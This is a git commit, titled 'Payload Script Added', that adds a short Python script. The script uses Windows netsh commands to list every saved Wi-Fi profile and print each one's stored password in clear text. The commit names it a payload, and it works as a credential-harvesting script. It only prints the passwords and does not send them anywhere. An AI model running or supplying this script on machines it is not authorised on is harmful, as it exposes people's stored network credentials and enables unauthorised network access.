f6c636efb925c870cc30c4cef98953d794bb3758
Hari <baluoger91@gmail.com>
2021-07-06 22:24:26 +0530

    Payload Script Added

---
+++ main.py
@@ -0,0 +1,16 @@
+import subprocess
+
+a = subprocess.check_output(['netsh','wlan','show','profiles']).decode('utf-8').split('\n')
+
+profiles = [i.split(":")[1][1:-1] for i in a if "All User Profile" in i]
+print(profiles)
+for i in profiles:
+	print(i)
+	results = subprocess.check_output(['netsh','wlan','show','profile',i,'key=clear',]).decode('utf-8').split('\n')
+	results = [b.split(":")[1][1:-1] for b in results if "Key Content" in b]
+	print(results)
+
+	try:
+		print("{:<30}	{:<}".format(i,results[0]))
+	except IndexError:
+		print("{:<30}	{:<}".format(i,""))
